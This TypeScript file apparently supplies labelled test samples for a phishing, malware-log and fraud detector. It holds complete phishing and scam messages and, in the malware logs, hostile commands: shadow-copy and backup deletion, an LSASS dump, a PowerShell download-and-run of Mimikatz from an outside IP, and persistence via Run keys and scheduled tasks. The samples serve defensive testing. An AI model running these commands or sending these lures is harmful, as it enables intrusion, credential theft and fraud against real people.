import { SamplePreset } from '../types';

export const SAMPLE_PRESETS: SamplePreset[] = [
  // ==============================================================================
  // 🎣 PHISHING & SMISHING DETECTOR - HIGH-RISK REAL-WORLD SAMPLES
  // ==============================================================================
  {
    id: 'PHISH-HIGH-01',
    module: 'phishing',
    title: 'Adversary-in-the-Middle (AiTM) Reverse Proxy Phishing',
    subtitle: 'Critical O365 Session Token Theft & MFA Bypass Hook',
    expectedVerdict: 'CRITICAL',
    description: 'Impersonates Microsoft 365 Security Center with an AiTM reverse-proxy payload designed to steal session cookies and bypass FIDO2/TOTP multi-factor authentication.',
    content: `From: "Microsoft 365 Security Center" <no-reply@security-alert-o365-auth.top>
To: target-employee@corporate-domain.com
Subject: [CRITICAL ALERT] Mandatory Re-Authentication Required: Suspicious Login Detected
Date: Mon, 29 Sep 2026 08:14:12 +0000
Authentication-Results: spf=softfail (sender IP 185.220.101.5) smtp.mailfrom=no-reply@security-alert-o365-auth.top; dkim=fail; dmarc=fail
Reply-To: security-ops@portal-sso-verify.top

Dear Account Holder,

Our identity protection engine detected unauthorized access to your cloud mailbox from an unrecognized IP address (45.154.255.88 - Saint Petersburg, RU). 

Per company zero-trust policy, your account session has expired. Action required: You must immediately verify your credentials within 24 hours to prevent permanent account suspension.

VERIFY YOUR IDENTITY NOW:
http://microsoft-login-verify.top/auth/session-sync?token=8f9a2b4c6e1d&redirect=https://portal.office.com

Failure to verify now will result in immediate revocation of your corporate SSO and Outlook access.

Security Operations Division
Microsoft 365 Cloud Protection`
  },
  {
    id: 'PHISH-HIGH-02',
    module: 'phishing',
    title: 'Executive BEC / Whaling Wire Transfer Fraud',
    subtitle: 'High-Risk C-Suite Impersonation & Forged Vendor Invoice',
    expectedVerdict: 'CRITICAL',
    description: 'Targeted whaling communication spoofing the Chief Executive Officer to authorize an emergency offshore wire transfer for a confidential acquisition.',
    content: `From: "David Sterling (CEO)" <ceo-office@exec-fin-acquisitions.top>
To: accounts-payable@corporate-domain.com
Reply-To: david.sterling.personal@consultant-priv-mail.xyz
Subject: CONFIDENTIAL: Urgent Wire Transfer Required for Project Titan Closing
Date: Mon, 29 Sep 2026 09:22:04 -0400
Authentication-Results: spf=softfail; dkim=none; dmarc=fail

Attention User,

I am currently in an all-day confidential acquisition board meeting and cannot take voice calls. 

We need to execute an urgent wire transfer of $428,500.00 immediately to complete the escrow retainer for Project Titan. Due to unexpected banking changes at the vendor’s side, the funds must be routed to our new clearing partner:

Bank: Apex International Commercial Bank
Account Name: Titan Settlement Holdings LLC
Routing / SWIFT: APEXUS33XXX
Account Number: 9844-2018-4921
Reference: Attached_Invoice_Sample.xlsm

Please treat this as urgent. Do not discuss this via public team channels until the public announcement tomorrow. Confirm by replying directly to this email once the wire transaction receipt is generated.

David Sterling
Chief Executive Officer`
  },
  {
    id: 'PHISH-HIGH-03',
    module: 'phishing',
    title: 'Banking KYC Freeze & Malicious APK Dropper (Smishing)',
    subtitle: 'High-Risk SMS Banking Deactivation Threat with Trojan APK',
    expectedVerdict: 'HIGH_RISK',
    description: 'High-urgency SMS threat alerting the user that their mobile banking access has been blocked due to missing PAN/KYC records, directing them to an external unverified APK.',
    content: `[SMS - SENDER: AX-SBISMS]
URGENT NOTICE: Dear Customer, Your SBI NetBanking and YONO account has been deactivated today due to non-updated PAN Card and KYC verification. 

Action required immediately to avoid permanent account block within 24 hours. Download and install the official SBI KYC Patch APK to verify your credentials and confirm your PIN:

http://sbi-kyc-verify-apk.top/download/SBI_Security_Patch_v4.2.apk

Do not ignore. Verify OTP and netbanking credentials immediately on the app to restore instant transaction services.`
  },
  {
    id: 'PHISH-HIGH-04',
    module: 'phishing',
    title: 'DevOps Cloud IAM Root Credential Revocation',
    subtitle: 'Direct-IP Phishing Portal Targeting AWS / GCP Infrastructure',
    expectedVerdict: 'HIGH_RISK',
    description: 'Spear-phishing alert aimed at cloud infrastructure administrators using an unencrypted direct IP address and credential harvesting form.',
    content: `From: "AWS CloudWatch Incident Monitor" <alerts@aws-iam-verify.top>
To: devops-lead@enterprise-infra.io
Subject: CRITICAL: Root Access Key Compromised - Immediate Action Required
Date: Mon, 29 Sep 2026 11:45:00 +0000

Dear User,

AWS Automated Security Guardian detected unauthenticated access using your Organization Root IAM Access Key (AKIA************) from an unknown IP space in Europe.

Your account suspended status will take effect within 24 hours unless root identity is reverified immediately.

Enter your password and confirm your PIN on the administrative gateway:
http://185.192.110.42/aws-iam-verify/login.php

Submit your master netbanking credentials and billing verification code to re-enable elastic cluster instances.

Amazon Web Services Trust & Safety`
  },

  // ==============================================================================
  // 🐛 MALWARE ARTIFACT & LOG INSPECTOR - HIGH-RISK REAL-WORLD SAMPLES
  // ==============================================================================
  {
    id: 'MAL-HIGH-01',
    module: 'malware',
    title: 'Ransomware Shadow Deletion & Volume Shredding (LockBit TTP)',
    subtitle: 'Critical Sysmon Event 1 - Shadow Copy Destruction & Recovery Impairment',
    expectedVerdict: 'CRITICAL',
    description: 'High-impact ransomware execution log demonstrating shadow copy deletion, recovery disablement, catalog purging, and encrypted file dropping (.lockbit extension).',
    content: `[SYSMON EVENT ID 1 - Process Creation]
UtcTime: 2026-09-29 03:14:52.102
ProcessGuid: {7f82b1c4-92d1-66f8-9921-000000001400}
ProcessId: 4892
Image: C:\\Windows\\System32\\cmd.exe
CommandLine: cmd.exe /c vssadmin.exe delete shadows /all /quiet & bcdedit /set {default} recoveryenabled no & wbadmin delete catalog -quiet
CurrentDirectory: C:\\Windows\\Temp\\
User: NT AUTHORITY\\SYSTEM
ParentImage: C:\\Users\\Administrator\\AppData\\Local\\Temp\\locker_payload.exe
ParentCommandLine: "C:\\Users\\Administrator\\AppData\\Local\\Temp\\locker_payload.exe" --pass 8f92b4c1 --encrypt-all

[FILE SYSTEM ARTIFACT MODIFICATION]
TargetDirectory: D:\\CorporateShares\\Finance\\
ExtensionAppended: .lockbit
DroppedNote: D:\\CorporateShares\\Finance\\README_RESTORE_FILES.txt
FileStatus: Your personal files are encrypted! All recovery_info has been removed. Delete_backups executed.`
  },
  {
    id: 'MAL-HIGH-02',
    module: 'malware',
    title: 'Fileless In-Memory Process Injection (Cobalt Strike / LOLBAS)',
    subtitle: 'Critical Sysmon Event 1 & 8 - VirtualAllocEx & CreateRemoteThread',
    expectedVerdict: 'CRITICAL',
    description: 'Fileless memory execution employing PowerShell encoded commands, VirtualAllocEx memory allocation with RWX permissions, and remote thread injection into explorer.exe.',
    content: `[SYSMON EVENT ID 1 - Process Creation]
Image: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe
CommandLine: powershell.exe -NoP -NonI -W Hidden -ExecutionPolicy Bypass -Enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAA=
ParentImage: C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE

[SYSMON EVENT ID 8 - CreateRemoteThread Detected]
SourceImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe
SourceProcessId: 5120
TargetImage: C:\\Windows\\explorer.exe
TargetProcessId: 3420
StartAddress: 0x00007FFB32191000
API_Calls: VirtualAllocEx(AllocationType=MEM_COMMIT, Protect=PAGE_EXECUTE_READWRITE), WriteProcessMemory(Process=explorer.exe, Size=4096 bytes)
DetectionMarker: C2_beacon callback scheduled to dynamic_dns_callback on reverse_shell listener.`
  },
  {
    id: 'MAL-HIGH-03',
    module: 'malware',
    title: 'LSASS Memory Dump & Credential Harvesting (Mimikatz TTP)',
    subtitle: 'High-Risk Procdump Memory Extraction & Autorun RunKey Persistence',
    expectedVerdict: 'HIGH_RISK',
    description: 'Adversary memory dump of Local Security Authority Subsystem Service (LSASS) to harvest plaintext passwords and NTLM hashes, establishing persistence via registry Run keys.',
    content: `[SYSMON EVENT ID 1 - Process Creation]
Image: C:\\Windows\\System32\\procdump64.exe
CommandLine: procdump64.exe -ma lsass.exe C:\\Windows\\Temp\\lsass.dmp
User: NT AUTHORITY\\SYSTEM
Hashes: SHA256=e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855

[POWERSHELL EXECUTION TRACE]
ScriptBlockText: Invoke-Expression (New-Object Net.WebClient).DownloadString('http://185.220.101.44/invoke-mimikatz.ps1'); sekurlsa::logonpasswords

[REGISTRY PERSISTENCE MODIFICATION]
Hive: HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run
ValueName: WindowsDefenderHealthMonitor
ValueData: "C:\\ProgramData\\svcupdate.exe"
ScheduledTaskCreated: schtasks /create /tn "SecurityMaintenanceCheck" /tr "C:\\ProgramData\\svcupdate.exe" /sc onlogon /ru SYSTEM`
  },
  {
    id: 'MAL-HIGH-04',
    module: 'malware',
    title: 'Worm Lateral Movement via Admin SMB Share & Double Extension',
    subtitle: 'High-Risk Network Worm Propagation & Malicious Double-Extension Dropper',
    expectedVerdict: 'HIGH_RISK',
    description: 'Self-replicating worm moving laterally across internal subnets using administrative C$ and ADMIN$ SMB shares with disguised double-extension executable payloads.',
    content: `[NETWORK CONNECTION LOG]
Source: 192.168.1.140:53110
Destination: 10.0.0.5:445 (Port 445 SMB)
Protocol: SMB2
Action: Tree Connect -> \\\\10.0.0.5\\ADMIN$\\System32\\
Remote_Service_Copy: PSEXESVC.exe deployed to \\\\10.0.0.5\\C$\\Windows\\Temp\\

[SUSPICIOUS FILE DISCOVERY]
FilePath: D:\\SharedDocs\\Q3_Financial_Statement.pdf.exe
FileProperties: Suspicious Double Extension Masking (Double file extension masking detected: .pdf.exe)
EntropyScore: 7.82 (UPX0 packed section identified)
Subnet_Scan: Rapid port sweep on 10.0.0.0/24 subnet for open ports 445 and 139.`
  },

  // ==============================================================================
  // 💳 FINANCIAL SCAM & FRAUD SCANNER - HIGH-RISK REAL-WORLD SAMPLES
  // ==============================================================================
  {
    id: 'FRD-HIGH-01',
    module: 'fraud',
    title: '"Digital Arrest" & Fake CBI / Narcotics Bureau Extortion',
    subtitle: 'Critical Government Impersonation & Rs 4.8 Lakh Escrow Coercion',
    expectedVerdict: 'CRITICAL',
    description: 'Extortion scheme impersonating the Central Bureau of Investigation (CBI) and Narcotics Control Bureau, alleging an illegal parcel and coercing an emergency Rs 4,80,000 security transfer under threat of immediate "Digital Arrest".',
    content: `[INCIDENT TRANSCRIPT - WHATSAPP VIDEO CALL & OFFICIAL NOTICE TRANSCRIPT]
Calling ID: +91 98210-44910 (Display: CBI Cyber Crime Cell / Narcotics Bureau Head Office)
Caller Name: "Inspector Vikram Rathore, Narcotics Control Bureau (NCB), Mumbai"

Transcript:
"Sir, a DHL / FedEx courier parcel dispatched from Mumbai to Thailand under your Aadhaar Number (XXXX-XXXX-9124) has been intercepted at customs. The parcel contains 5 expired passports, 16 bank passbooks, and 250 grams of contraband MDMA. 

A non-bailable arrest warrant has been issued by Mumbai Police and the Supreme Court against your name. You are currently placed under 24-hour Digital Arrest. You are forbidden from leaving your room or disconnecting this Skype verification call.

To establish your financial innocence and obtain a Supreme Court bail clearance certificate, you must transfer a refundable security deposit of Rs 4,80,000 immediately to the RBI Reserve Escrow Account:
Bank: State Bank of India
Account Name: RBI Financial Verification Cell
Account: 3981-0291-8841
IFSC: SBIN0001420

If the funds are not received within 45 minutes, a local police task force will raid your residence."`
  },
  {
    id: 'FRD-HIGH-02',
    module: 'fraud',
    title: 'Reverse UPI QR "Scan to Receive Money" Marketplace Scam',
    subtitle: 'Critical OLX Buyer Deception - Entering UPI PIN to "Receive" Payment',
    expectedVerdict: 'CRITICAL',
    description: 'Predatory marketplace trick where an alleged buyer sends a "payment QR code" instructing the victim that entering their UPI PIN is required to "receive" funds into their bank account.',
    content: `[WHATSAPP CHAT WITH ALLEGED BUYER - OLX MARKETPLACE]
Buyer: "Hello, I am ready to purchase your second-hand laptop for Rs 45,000 immediately. I am an Army Officer posted in Pune Cantt, so my staff will pick it up tomorrow. 

I am sending you the full advance payment right now via GooglePay / PhonePe. 

Here is the official bank merchant payout QR Code attached:
[IMAGE: GPay_Payment_Authorization_QR_Code_Rs45000.png]

INSTRUCTIONS TO RECEIVE MONEY:
1. Open your GPay / PhonePe / Paytm application.
2. Scan this QR code to receive money into your linked bank account.
3. When prompted, enter your 6-digit UPI PIN to receive payment of Rs 45,000.
4. As soon as you enter your secret UPI PIN, the funds will be credited to your account.

Hurry up, this UPI collect request merchant barcode expires in 10 minutes!"`
  },
  {
    id: 'FRD-HIGH-03',
    module: 'fraud',
    title: 'Predatory Loan App Contact Harvesting & Extortion',
    subtitle: 'High-Risk Instant Loan Blackmail - Morphed Photos Threat',
    expectedVerdict: 'HIGH_RISK',
    description: 'Predatory micro-loan extortion syndicate demanding triple repayment under explicit threat of broadcasting morphed photos to the victim’s entire scraped smartphone contact book.',
    content: `[WHATSAPP MESSAGE & SMS BARRAGE - FastRupee Loan App]
URGENT FINAL RECOVERY NOTICE:
Borrower: Rahul Sharma
Reference ID: FR-901842
Principal Disbursed: Rs 4,500 | Overdue Demand: Rs 28,000

Listen carefully Rahul! Your loan repayment is overdue by 7 days. Our application has already extracted your complete contact list (842 phone numbers), personal photos, and device gallery.

If you do not pay double or transfer Rs 28,000 within 2 hours, we will initiate public defamation protocol:
1. Your morphed photos will be sent to all your contacts, including your father, mother, and office manager.
2. We will label you a financial fraudster across WhatsApp groups.
3. Access contacts permission was granted by you during installation, so we have full authority.

Pay Rs 28,000 immediately to UPI ID: merchant-liquidity@okaxis or suffer the consequences.`
  },
  {
    id: 'FRD-HIGH-04',
    module: 'fraud',
    title: 'Telegram VIP "Like & Earn" Prepaid Task Scam',
    subtitle: 'High-Risk Crypto Doubling & Tiered Deposit Lockout Scheme',
    expectedVerdict: 'HIGH_RISK',
    description: 'Tiered task-based fraud on Telegram promising thousands of rupees for rating products, which escalates into mandatory high-deposit "VIP crypto trading task" requirements to unlock frozen balances.',
    content: `[TELEGRAM CHANNEL: Global Marketing VIP Tasks Group #88]
Admin: "Welcome to Part-time Online Job Daily Payout Program! Earn $500 daily by simply clicking like on YouTube videos and leaving 5-star Google Maps reviews!

Congratulations! You completed Level 1 task: Rs 150 credited to your wallet!
Congratulations! You completed Level 2 task: Rs 500 credited to your wallet!

[CRITICAL ALERT - VIP TASK LEVEL UPGRADE]
Your account balance is now Rs 94,500. To withdraw your full earnings, you have entered the Special Merchant Crypto Task.
Action required: You must make a prepaid task deposit of Rs 35,000 into the crypto multiplier liquidity pool. 
Send 1 BTC get 2 guaranteed 100% daily profit return.

If deposit is not transferred within 15 minutes, your accumulated earnings of Rs 94,500 will be permanently frozen per merchant contract."`
  }
];
